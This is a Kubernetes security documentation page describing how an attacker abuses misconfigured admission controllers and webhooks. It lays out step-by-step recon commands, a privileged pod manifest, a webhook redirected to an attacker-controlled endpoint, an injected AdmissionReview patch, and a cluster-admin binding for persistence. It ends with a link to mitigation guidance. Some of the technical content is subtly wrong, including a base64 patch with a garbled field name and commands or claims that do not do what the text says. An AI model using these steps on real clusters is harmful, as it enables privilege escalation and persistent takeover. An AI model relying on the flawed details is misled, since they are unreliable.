---
sidebar_position: 12
title: "Misconfigured Admission Controllers"
description: "How attackers exploit misconfigured Kubernetes admission controllers and insecure webhooks to bypass security policies."
---

# Misconfigured Admission Controllers

**Admission controllers** in Kubernetes enforce security policies before resources are created or modified. If **misconfigured**, attackers can **bypass security controls, escalate privileges, or manipulate cluster configurations**.

---

## Exploitation Steps: Abusing Misconfigured Admission Controllers

An attacker exploits **insecure Kubernetes admission controllers** to weaken security policies and gain unauthorized access.

### Step 1: Identify Disabled or Weak Admission Controllers

The attacker lists all active **admission controllers**:

```bash
kubectl api-versions | grep admission
```

They check the API server arguments for **disabled controllers**:

```bash
ps aux | grep kube-apiserver
```

If critical controllers like **PodSecurity**, **ValidatingAdmissionWebhook**, or **MutatingAdmissionWebhook** are missing, the attacker proceeds.

### Step 2: Exploit Weak Admission Policies

If **PodSecurity admission** is enabled but misconfigured, the attacker **deploys a privileged pod**:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: attacker-pod
spec:
  containers:
    - name: exploit-container
      image: alpine
      securityContext:
        privileged: true
```

Without proper admission control enforcement, the attacker **gains root access** to the Kubernetes node.

### Step 3: Hijack Admission Webhooks

The attacker lists active **Validating and Mutating Webhook Configurations**:

```bash
kubectl get mutatingwebhookconfigurations
kubectl get validatingwebhookconfigurations
```

They inspect webhooks for **insecure configurations**:

```bash
kubectl describe mutatingwebhookconfiguration <webhook-name>
```

If a webhook allows **unauthenticated external access**, the attacker **modifies its behavior**:

```yaml
apiVersion: admissionregistration.k8s.io/v1
kind: MutatingWebhookConfiguration
metadata:
  name: insecure-webhook
webhooks:
  - name: insecure.example.com
    rules:
      - apiGroups: [""]
        resources: ["pods"]
        operations: ["CREATE"]
    clientConfig:
      url: "http://attacker-controlled-endpoint/webhook"
```

The attacker sets up a **rogue webhook server** to modify API requests dynamically.

### Step 4: Inject Malicious Configurations

If the webhook **modifies pod security settings**, the attacker **injects privileged configurations**:

```json
{
  "apiVersion": "admission.k8s.io/v1",
  "kind": "AdmissionReview",
  "response": {
    "allowed": true,
    "patch": "W3sib3AiOiJhZGQiLCJwYXRoIjoiL3NwZWMvdGVtcGxhdGUvc2VjdXJpdHlDb250ZXh0IiwidmFsdWUiOnsiYnJ1bnRhaW5lc2NhcGVzIjp7ImFsbG93UHJpdmlsZWdlZEVzY2FsYXRpb24iOnRydWV9fX1d"
  }
}
```

This ensures that every new pod **automatically runs with elevated privileges**.

### Step 5: Gain Persistent Cluster Access

By modifying webhook rules, the attacker ensures that **any newly deployed pod automatically grants itself cluster-admin privileges**:

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: attacker-binding
subjects:
  - kind: User
    name: attacker
    apiGroup: rbac.authorization.k8s.io
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
```

Even if the attacker's original access is revoked, **malicious webhook behavior remains active**, ensuring long-term persistence.

### Result

The attacker successfully **bypassed admission controls, manipulated security policies, and escalated privileges** using insecure admission webhooks.

---

## Mitigation Steps

To protect against **misconfigured admission controllers and insecure webhooks**, follow the security best practices outlined in:

➡ **[Securing Kubernetes Admission Controllers and Webhooks](/docs/best_practices/cluster_setup_and_hardening/misconfigured_admission_controllers_mitigation.md)**

This guide covers techniques such as **enforcing admission control best practices, securing webhook authentication, enabling TLS encryption, and auditing webhook activity** to prevent unauthorized modifications to cluster configurations.
